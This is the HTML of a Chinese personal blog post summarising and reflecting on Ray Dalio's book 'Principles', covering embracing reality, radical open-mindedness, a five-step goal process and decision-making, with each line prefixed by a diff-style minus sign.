-        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">时间就像一条河流，</span><br><span class="line">载着我们顺流而下，</span><br><span class="line">遇到现实，需要决策，</span><br><span class="line">但我们无法停留，</span><br><span class="line">也无法回避，</span><br><span class="line">只能以最好的方式应对。</span><br><span class="line">									              ——《原则》瑞-达利欧</span><br></pre></td></tr></table></figure>
-<p>读原则的个人感悟，小mark一下。</p>
-<h3 id="我想要什么？事实是什么？如何行动？"><a href="#我想要什么？事实是什么？如何行动？" class="headerlink" title="我想要什么？事实是什么？如何行动？"></a>我想要什么？事实是什么？如何行动？</h3><p>与失败比起来，我对乏味和平庸的恐惧要严重得多，对我而已，很好的事要比糟糕的事好，而糟糕的事要比平庸的事好，因为糟糕的事至少给生活增加了滋味。</p>
-<p><img src="/2018/11/26/原则/yz2.jpg" alt="yz2"></p>
-<p>当我开始从理解现实规律的视角看待现实，而不是认为现实不对时，我发现几乎所有起初看起来“不好”的东西，如雨天，缺点甚至是死亡，都是由于我对于自己相要拥有的东西持有先入为主之见。我逐渐意识到，我产生这些最初的反应，是因为我没有把事物放到大背景下看待，即现实的构造是让整体实现最优，而不是尽力实现我的愿望。</p>
-<p><strong>没有痛苦就没有收获，痛苦+反思=进步</strong></p>
-<p>人总是难以识别并承认自身的错误和弱点，有时这是因为没有自知之明，但更常见的原因是。自尊心起了阻碍作用。</p>
-<h3 id="如何做到头脑极度开放："><a href="#如何做到头脑极度开放：" class="headerlink" title="如何做到头脑极度开放："></a>如何做到头脑极度开放：</h3><p>1.诚恳地相信你也许并不知道最好的解决办法是什么，并认识到，与你知道的东西相比，能不能妥善处理“不知道”才是更重要的。</p>
-<p>2.认识到决策应当分成两步：先分析所有相关信息，然后决定。</p>
-<p>3.不要担心自己的形象，只关心如何实现目标。</p>
-<p>4.认识到你不能“只产出不吸纳”</p>
-<p>5.认识到为了能够从他人的角度看待事物，你必须暂时悬置判断，只有设身处地，你才能合理评估另一种观点的价值。</p>
-<p>6.谨记，你是在寻找最好的答案，而不是你自己能得出的最好答案。</p>
-<p>7.搞清楚你是在争论还是在试图理解一个问题，并根据你和对方的可信度，想想哪种做法最合理。</p>
-<h3 id="生活原则？"><a href="#生活原则？" class="headerlink" title="生活原则？"></a>生活原则？</h3><p> 独立思考并决定：</p>
-<p>（1）你想要什么；</p>
-<p>（2）事实是什么；</p>
-<p>（3）面对事实</p>
-<p>如何实现自己的愿望，而且要保持谦逊和心胸开阔，以便你能动用自己的最佳思维。</p>
-<p>生活原则导言</p>
-<p>● 考察影响你的那些事物的规律，从而理解其背后的因果关系，并学习有效应对这些事物的原则。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.拥抱现实，应对现实</span><br><span class="line">2.用五步流程实现人生愿望</span><br><span class="line">3.做到头脑极度开放</span><br><span class="line">4.理解人与人大不相同</span><br><span class="line">5.学习如何有效决策</span><br></pre></td></tr></table></figure>
-<h4 id="1-拥抱现实，应对现实"><a href="#1-拥抱现实，应对现实" class="headerlink" title="1. 拥抱现实，应对现实"></a>1. 拥抱现实，应对现实</h4><h5 id="1-1-做一个超级现实的人"><a href="#1-1-做一个超级现实的人" class="headerlink" title="1.1 做一个超级现实的人"></a>1.1 做一个超级现实的人</h5><p>a. 梦想+现实+决心=成功的生活。</p>
-<h5 id="1-2-真相（或者更精确地说，对现实的准确理解）是任何良好结果的根本依据"><a href="#1-2-真相（或者更精确地说，对现实的准确理解）是任何良好结果的根本依据" class="headerlink" title="1.2 真相（或者更精确地说，对现实的准确理解）是任何良好结果的根本依据"></a>1.2 真相（或者更精确地说，对现实的准确理解）是任何良好结果的根本依据</h5><h5 id="1-3-做到头脑极度开放、极度透明"><a href="#1-3-做到头脑极度开放、极度透明" class="headerlink" title="1.3 做到头脑极度开放、极度透明"></a>1.3 做到头脑极度开放、极度透明</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a. 对于快速学习和有效改变而言，头脑极度开放、极度透明是价值无限的。</span><br><span class="line"></span><br><span class="line">b.不要担心其他人的看法，使之成为你的障碍。</span><br><span class="line"></span><br><span class="line">c. 拥抱极度求真和极度透明将带来更有意义的工作和更有意义的人际关系。</span><br></pre></td></tr></table></figure>
-<h5 id="1-4-观察自然，学习现实规律"><a href="#1-4-观察自然，学习现实规律" class="headerlink" title="1.4 观察自然，学习现实规律"></a>1.4 观察自然，学习现实规律</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a. 不要固守你对事物“应该”是什么样的看法，这将使你无法了解真实的情况。</span><br><span class="line"></span><br><span class="line">b. 一个东西要“好”，就必须符合现实的规律，并促进整体的进化，这能带来最大的回报。</span><br><span class="line"></span><br><span class="line">c. 进化是宇宙中最强大的力量，是唯一永恒的东西，是一切的驱动力。</span><br><span class="line"></span><br><span class="line">d. 不进化就死亡。</span><br></pre></td></tr></table></figure>
-<h5 id="1-5-进化是生命最大的成就和最大的回报"><a href="#1-5-进化是生命最大的成就和最大的回报" class="headerlink" title="1.5 进化是生命最大的成就和最大的回报"></a>1.5 进化是生命最大的成就和最大的回报</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a. 个体的激励机制必须符合群体的目标。</span><br><span class="line"></span><br><span class="line">b. 现实为了整体而趋向最优化，而不是为了个体。</span><br><span class="line"></span><br><span class="line">c. 通过快速试错以适应现实是无价的。</span><br><span class="line"></span><br><span class="line">d. 意识到你既是一切又什么都不是，并决定你想成为什么样子。</span><br><span class="line"></span><br><span class="line">e. 你的未来取决于你的视角。</span><br></pre></td></tr></table></figure>
-<h5 id="1-6-理解自然提供的现实教训"><a href="#1-6-理解自然提供的现实教训" class="headerlink" title="1.6 理解自然提供的现实教训"></a>1.6 理解自然提供的现实教训</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a. 把你的进化最大化。</span><br><span class="line"></span><br><span class="line">b. 记住“没有痛苦就没有收获”。</span><br><span class="line"></span><br><span class="line">c. 自然的一项根本法则是，为了赢得力量，人必须努力突破极限，而这是痛苦的。</span><br></pre></td></tr></table></figure>
-<h5 id="1-7-痛苦-反思-进步"><a href="#1-7-痛苦-反思-进步" class="headerlink" title="1.7 痛苦+反思=进步"></a>1.7 痛苦+反思=进步</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a. 迎接而非躲避痛苦。</span><br><span class="line"></span><br><span class="line">b. 接受严厉的爱。</span><br></pre></td></tr></table></figure>
-<h5 id="1-8-考虑后续与再后续的结果"><a href="#1-8-考虑后续与再后续的结果" class="headerlink" title="1.8 考虑后续与再后续的结果"></a>1.8 考虑后续与再后续的结果</h5><h5 id="1-9-接受结果"><a href="#1-9-接受结果" class="headerlink" title="1.9 接受结果"></a>1.9 接受结果</h5><h5 id="1-10-从更高的层次俯视机器"><a href="#1-10-从更高的层次俯视机器" class="headerlink" title="1.10 从更高的层次俯视机器"></a>1.10 从更高的层次俯视机器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a. 把自己想象成一部在大机器里运转的小机器，并明白你有能力改变你的机器以实现更好的结果。</span><br><span class="line"></span><br><span class="line">b. 通过比较你实现的结果和你的目标，你就能确定如何改进你的机器。</span><br><span class="line"></span><br><span class="line">c. 区别作为机器设计者的你和作为机器中工作者的你。</span><br><span class="line"></span><br><span class="line">d. 大多数人犯下的最大错误是不客观看待自己以及其他人，这导致他们一次次地栽在自己或其他人的弱点上。</span><br><span class="line"></span><br><span class="line">e. 成功的人能超越自身，客观看待事物，并管理事物以塑造改变。</span><br><span class="line"></span><br><span class="line">f. 在你不擅长的领域请教擅长的其他人，这是一个你无论如何都应该培养的出色技能，这将帮助你建立起安全护栏，避免自己做错事。</span><br><span class="line"></span><br><span class="line">g. 因为客观看待自身很困难，所以你需要依赖其他人的意见，以及全部证据。</span><br><span class="line"></span><br><span class="line">h. 如果你的头脑足够开放，足够有决心，你几乎可以实现任何愿望。</span><br></pre></td></tr></table></figure>
-<h4 id="2-用五步流程实现你的人生愿望"><a href="#2-用五步流程实现你的人生愿望" class="headerlink" title="2.用五步流程实现你的人生愿望"></a>2.用五步流程实现你的人生愿望</h4><h5 id="2-1-有明确的目标"><a href="#2-1-有明确的目标" class="headerlink" title="2.1 有明确的目标"></a>2.1 有明确的目标</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a. 排列优先顺序：尽管你几乎可以得到你想要的任何东西，但你不可能得到你想要的所有东西。</span><br><span class="line"></span><br><span class="line">b. 不要混淆目标和欲望。</span><br><span class="line"></span><br><span class="line">c. 调和你的目标和欲望，以明确你在生活中真正想要的东西。</span><br><span class="line"></span><br><span class="line">d. 不要把成功的装饰误认为成功本身。</span><br><span class="line"></span><br><span class="line">e. 永远不要因为你觉得某个目标无法实现就否决它。</span><br><span class="line"></span><br><span class="line">f. 谨记伟大的期望创造伟大的能力。</span><br><span class="line"></span><br><span class="line">g. 如果你拥有灵活性并自我归责，那么几乎没有什么能阻止你成功。</span><br><span class="line"></span><br><span class="line">h. 知道如何对待挫折和知道如何前进一样重要。</span><br></pre></td></tr></table></figure>
-<h5 id="2-2-找出问题，并且不容忍问题"><a href="#2-2-找出问题，并且不容忍问题" class="headerlink" title="2.2 找出问题，并且不容忍问题"></a>2.2 找出问题，并且不容忍问题</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a. 把令人痛苦的问题视为考验你的潜在进步机会。</span><br><span class="line"></span><br><span class="line">b. 不要逃避问题，因为问题根植于看起来并不美好的残酷现实。</span><br><span class="line"></span><br><span class="line">c. 要精准地找到问题所在。</span><br><span class="line"></span><br><span class="line">d. 不要把问题的某个原因误认为问题本身。</span><br><span class="line"></span><br><span class="line">e. 区分大问题和小问题。</span><br><span class="line"></span><br><span class="line">f. 找出一个问题之后，不要容忍问题。</span><br></pre></td></tr></table></figure>
-<h5 id="2-3-诊断问题，找到问题的根源"><a href="#2-3-诊断问题，找到问题的根源" class="headerlink" title="2.3 诊断问题，找到问题的根源"></a>2.3 诊断问题，找到问题的根源</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a. 先把问题是什么弄明白，再决定怎么做。</span><br><span class="line"></span><br><span class="line">b. 区分直接原因和根本原因。</span><br><span class="line"></span><br><span class="line">c. 认识到了解人（包括你自己）的特性，有助于对其形成合理预期。</span><br></pre></td></tr></table></figure>
-<h5 id="2-4-规划方案"><a href="#2-4-规划方案" class="headerlink" title="2.4 规划方案"></a>2.4 规划方案</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a. 前进之前先回顾。</span><br><span class="line"></span><br><span class="line">b. 把你的问题看作一部机器产生的一系列结果。</span><br><span class="line"></span><br><span class="line">c. 谨记实现你的目标通常有很多途径。</span><br><span class="line"></span><br><span class="line">d. 把你的方案设想为一个电影剧本，然后循序渐进地思考由谁来做什么事。</span><br><span class="line"></span><br><span class="line">e. 把你的方案写下来，让所有人都能看到，并对照方案执行。</span><br><span class="line"></span><br><span class="line">f. 要明白，规划一个好方案不一定需要很多时间。</span><br></pre></td></tr></table></figure>
-<h5 id="2-5-坚定地从头至尾执行方案"><a href="#2-5-坚定地从头至尾执行方案" class="headerlink" title="2.5 坚定地从头至尾执行方案"></a>2.5 坚定地从头至尾执行方案</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a. 规划做得再好，不执行也无济于事。</span><br><span class="line"></span><br><span class="line">b. 良好工作习惯的重要性常被大大低估。</span><br><span class="line"></span><br><span class="line">c. 建立清晰的衡量标准来确保你在严格执行方案。</span><br></pre></td></tr></table></figure>
-<h5 id="2-6-谨记：如果你找到了解决方案，弱点是不重要的"><a href="#2-6-谨记：如果你找到了解决方案，弱点是不重要的" class="headerlink" title="2.6 谨记：如果你找到了解决方案，弱点是不重要的"></a>2.6 谨记：如果你找到了解决方案，弱点是不重要的</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a. 考察你犯错误的类型，并识别你通常在五步流程中的哪一步上做得不好。</span><br><span class="line"></span><br><span class="line">b. 每个人都至少有一个最大的弱点阻碍其成功，找到你的这个弱点并处理它。</span><br></pre></td></tr></table></figure>
-<h5 id="2-7-理解你和其他人的“意境地图”与谦逊性"><a href="#2-7-理解你和其他人的“意境地图”与谦逊性" class="headerlink" title="2.7 理解你和其他人的“意境地图”与谦逊性"></a>2.7 理解你和其他人的“意境地图”与谦逊性</h5><h4 id="3-做到头脑极度开放"><a href="#3-做到头脑极度开放" class="headerlink" title="3.做到头脑极度开放"></a>3.做到头脑极度开放</h4><h5 id="3-1-认识你的两大障碍"><a href="#3-1-认识你的两大障碍" class="headerlink" title="3.1 认识你的两大障碍"></a>3.1 认识你的两大障碍</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a. 理解你的自我意识障碍。</span><br><span class="line"></span><br><span class="line">b. “两个你”在争夺对你的控制权。</span><br><span class="line"></span><br><span class="line">c. 理解你的思维盲点障碍。</span><br></pre></td></tr></table></figure>
-<h5 id="3-2-奉行头脑极度开放"><a href="#3-2-奉行头脑极度开放" class="headerlink" title="3.2 奉行头脑极度开放"></a>3.2 奉行头脑极度开放</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a. 诚恳地相信你也许并不知道最好的解决办法是什么，并认识到，与你知道的东西相比，能不能妥善处理“不知道”才是更重要的。</span><br><span class="line"></span><br><span class="line">b. 认识到决策应当分成两步：先分析所有相关信息，然后决定。</span><br><span class="line"></span><br><span class="line">c. 不要担心自己的形象，只关心如何实现目标。</span><br><span class="line"></span><br><span class="line">d. 认识到你不能“只产出不吸纳”。</span><br><span class="line"></span><br><span class="line">e. 认识到为了能够从他人的角度看待事物，你必须暂时悬置判断，只有设身处地，你才能合理评估另一种观点的价值。</span><br><span class="line"></span><br><span class="line">f. 谨记，你是在寻找最好的答案，而不是你自己能得出的最好答案。</span><br><span class="line"></span><br><span class="line">g. 搞清楚你是在争论还是在试图理解一个问题，并根据你和对方的可信度，想想哪种做法最合理。</span><br></pre></td></tr></table></figure>
-<h5 id="3-3-领会并感激：深思熟虑的意见分歧"><a href="#3-3-领会并感激：深思熟虑的意见分歧" class="headerlink" title="3.3 领会并感激：深思熟虑的意见分歧"></a>3.3 领会并感激：深思熟虑的意见分歧</h5><h5 id="3-4-和可信的、愿意表达分歧的人一起审视你的观点"><a href="#3-4-和可信的、愿意表达分歧的人一起审视你的观点" class="headerlink" title="3.4 和可信的、愿意表达分歧的人一起审视你的观点"></a>3.4 和可信的、愿意表达分歧的人一起审视你的观点</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a. 为最坏的情况做准备，以尽量使其不那么糟糕。</span><br></pre></td></tr></table></figure>
-<h5 id="3-5-识别你应当注意的头脑封闭和头脑开放的不同迹象"><a href="#3-5-识别你应当注意的头脑封闭和头脑开放的不同迹象" class="headerlink" title="3.5 识别你应当注意的头脑封闭和头脑开放的不同迹象"></a>3.5 识别你应当注意的头脑封闭和头脑开放的不同迹象</h5><h5 id="3-6-理解你如何做到头脑极度开放"><a href="#3-6-理解你如何做到头脑极度开放" class="headerlink" title="3.6 理解你如何做到头脑极度开放"></a>3.6 理解你如何做到头脑极度开放</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a. 经常利用痛苦来引导自己进行高质量的思考。</span><br><span class="line"></span><br><span class="line">b. 将头脑开放作为一种习惯。</span><br><span class="line"></span><br><span class="line">c. 认识自己的思维盲点。</span><br><span class="line"></span><br><span class="line">d. 假如很多可信的人都说你正在做错事，只有你不这么看，你就要想想自己是不是看偏了。</span><br><span class="line"></span><br><span class="line">e. 冥想。</span><br><span class="line"></span><br><span class="line">f. 重视证据，并鼓励其他人也这么做。</span><br><span class="line"></span><br><span class="line">g. 尽力帮助其他人也保持头脑开放。</span><br><span class="line"></span><br><span class="line">h. 使用以证据为基础的决策工具。</span><br><span class="line"></span><br><span class="line">i. 知道什么时候应当停止为自己的观点辩护，信任自己的决策程序。</span><br></pre></td></tr></table></figure>
-<h4 id="4-理解人与人大不相同"><a href="#4-理解人与人大不相同" class="headerlink" title="4.理解人与人大不相同"></a>4.理解人与人大不相同</h4><h5 id="4-1-明白你与其他人的思维方式能带来的力量"><a href="#4-1-明白你与其他人的思维方式能带来的力量" class="headerlink" title="4.1 明白你与其他人的思维方式能带来的力量"></a>4.1 明白你与其他人的思维方式能带来的力量</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a. 我们拥有各种天生特征，既可能帮助自己也可能伤害自己，取决于如何应用。</span><br></pre></td></tr></table></figure>
-<h5 id="4-2-有意义的工作和有意义的人际关系不仅是我们做出的美好选择，而且是我们天生的生理需求"><a href="#4-2-有意义的工作和有意义的人际关系不仅是我们做出的美好选择，而且是我们天生的生理需求" class="headerlink" title="4 .2 有意义的工作和有意义的人际关系不仅是我们做出的美好选择，而且是我们天生的生理需求"></a>4 .2 有意义的工作和有意义的人际关系不仅是我们做出的美好选择，而且是我们天生的生理需求</h5><h5 id="4-3-理解大脑里的主要斗争，以及如何控制这些斗争，以实现“你”的愿望"><a href="#4-3-理解大脑里的主要斗争，以及如何控制这些斗争，以实现“你”的愿望" class="headerlink" title="4 .3 理解大脑里的主要斗争，以及如何控制这些斗争，以实现“你”的愿望"></a>4 .3 理解大脑里的主要斗争，以及如何控制这些斗争，以实现“你”的愿望</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a. 要明白，意识与潜意识在不断斗争。</span><br><span class="line"></span><br><span class="line">b. 要知道最常发生的斗争是情绪和思考的斗争。</span><br><span class="line"></span><br><span class="line">c. 调和你的情绪和思考。</span><br><span class="line"></span><br><span class="line">d. 善择你的习惯。</span><br><span class="line"></span><br><span class="line">e. 坚持友善地训练“较低层次的你”，以养成好的习惯。</span><br><span class="line"></span><br><span class="line">f. 理解右脑思维和左脑思维的差别。</span><br><span class="line"></span><br><span class="line">g. 理解大脑可以改变的程度。</span><br></pre></td></tr></table></figure>
-<h5 id="4-4-认识自己和他人的特性"><a href="#4-4-认识自己和他人的特性" class="headerlink" title="4.4 认识自己和他人的特性"></a>4.4 认识自己和他人的特性</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a. 内向与外向。</span><br><span class="line"></span><br><span class="line">b. 直觉与感知。</span><br><span class="line"></span><br><span class="line">c. 思考与感觉。</span><br><span class="line"></span><br><span class="line">d. 计划与发觉。</span><br><span class="line"></span><br><span class="line">e. 创造者、推进者、改进者、贯彻者与变通者。</span><br><span class="line"></span><br><span class="line">f. 关注任务与关注目标。</span><br><span class="line"></span><br><span class="line">g. 职场人格量表。</span><br><span class="line"></span><br><span class="line">h. 塑造者是能从构想一路走到构想实现的人。</span><br></pre></td></tr></table></figure>
-<p>#####4.5 无论你要实现什么目标，让合适的人各司其职以支持你的目标，是成功的关键</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a. 管理你自己，并协调其他人实现你的目标。</span><br></pre></td></tr></table></figure>
-<h4 id="5-学习如何有效决策"><a href="#5-学习如何有效决策" class="headerlink" title="5.学习如何有效决策"></a>5.学习如何有效决策</h4><h5 id="5-1-要认识到："><a href="#5-1-要认识到：" class="headerlink" title="5.1 要认识到："></a>5.1 要认识到：</h5><p>（1）影响好决策的最大威胁是有害的情绪；</p>
-<p>（2）决策是一个两步流程（先了解后决定）</p>
-<h5 id="5-2-综合分析眼前的形势"><a href="#5-2-综合分析眼前的形势" class="headerlink" title="5.2 综合分析眼前的形势"></a>5.2 综合分析眼前的形势</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a. 你能做的最重要的决定之一是决定问谁。</span><br><span class="line"></span><br><span class="line">b. 不要听到什么信什么。</span><br><span class="line"></span><br><span class="line">c. 所有东西都是放在眼前看更大。</span><br><span class="line"></span><br><span class="line">d. 不要夸大新东西的好处。</span><br><span class="line"></span><br><span class="line">e. 不要过度分析细节。</span><br></pre></td></tr></table></figure>
-<h5 id="5-3-综合分析变化中的形势"><a href="#5-3-综合分析变化中的形势" class="headerlink" title="5.3 综合分析变化中的形势"></a>5.3 综合分析变化中的形势</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a. 始终记住改善事物的速度和水平，以及两者的关系。</span><br><span class="line"></span><br><span class="line">b. 不必过于精确。</span><br><span class="line"></span><br><span class="line">c. 谨记“80/20法则”，并明白关键性的“20%”是什么。</span><br><span class="line"></span><br><span class="line">d. 不要做完美主义者。</span><br></pre></td></tr></table></figure>
-<h5 id="5-4-高效地综合考虑各个层次"><a href="#5-4-高效地综合考虑各个层次" class="headerlink" title="5.4 高效地综合考虑各个层次"></a>5.4 高效地综合考虑各个层次</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a. 用“基线以上”和“基线以下”来确定谈话位于哪一层。</span><br><span class="line"></span><br><span class="line">b. 谨记，决策需要在合理的层次做出，但也应在各层次之间保持一致。</span><br></pre></td></tr></table></figure>
-<h5 id="5-5-综合分析现实、理解如何行动的最好工具是逻辑、理性和常识"><a href="#5-5-综合分析现实、理解如何行动的最好工具是逻辑、理性和常识" class="headerlink" title="5.5 综合分析现实、理解如何行动的最好工具是逻辑、理性和常识"></a>5.5 综合分析现实、理解如何行动的最好工具是逻辑、理性和常识</h5><h5 id="5-6-根据预期价值计算做决策"><a href="#5-6-根据预期价值计算做决策" class="headerlink" title="5.6 根据预期价值计算做决策"></a>5.6 根据预期价值计算做决策</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a. 不管你押对的概率已经有多大，提高你的押对概率始终有价值。</span><br><span class="line"></span><br><span class="line">b. 知道什么时候不要去押注，和知道什么注值得押同样重要。</span><br><span class="line"></span><br><span class="line">c. 最好的选择是好处多于坏处的选择，不是毫无坏处的选择。</span><br></pre></td></tr></table></figure>
-<h5 id="5-7-比较更多信息带来的价值和不做决定造成的成本，决定优先顺序"><a href="#5-7-比较更多信息带来的价值和不做决定造成的成本，决定优先顺序" class="headerlink" title="5.7 比较更多信息带来的价值和不做决定造成的成本，决定优先顺序"></a>5.7 比较更多信息带来的价值和不做决定造成的成本，决定优先顺序</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a. 先把你的“必做之事”做完，再做你的“想做之事”。</span><br><span class="line"></span><br><span class="line">b. 你很可能没有时间处理不重要的事，那最好将它留着，以免自己没有时间处理重要的事。</span><br><span class="line"></span><br><span class="line">c. 不要把概率当作可能性。</span><br></pre></td></tr></table></figure>
-<h5 id="5-8-简化"><a href="#5-8-简化" class="headerlink" title="5.8 简化"></a>5.8 简化</h5><h5 id="5-9-使用原则"><a href="#5-9-使用原则" class="headerlink" title="5.9 使用原则"></a>5.9 使用原则</h5><h5 id="5-10-对你的决策进行可信度加权"><a href="#5-10-对你的决策进行可信度加权" class="headerlink" title="5.10 对你的决策进行可信度加权"></a>5.10 对你的决策进行可信度加权</h5><h5 id="5-11-把你的原则转换成算法，让计算机和你一起决策"><a href="#5-11-把你的原则转换成算法，让计算机和你一起决策" class="headerlink" title="5.11 把你的原则转换成算法，让计算机和你一起决策"></a>5.11 把你的原则转换成算法，让计算机和你一起决策</h5><h5 id="5-12-在深刻理解人工智能之前不要过度信赖它"><a href="#5-12-在深刻理解人工智能之前不要过度信赖它" class="headerlink" title="5.12 在深刻理解人工智能之前不要过度信赖它"></a>5.12 在深刻理解人工智能之前不要过度信赖它</h5>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">others</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/26/原则/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
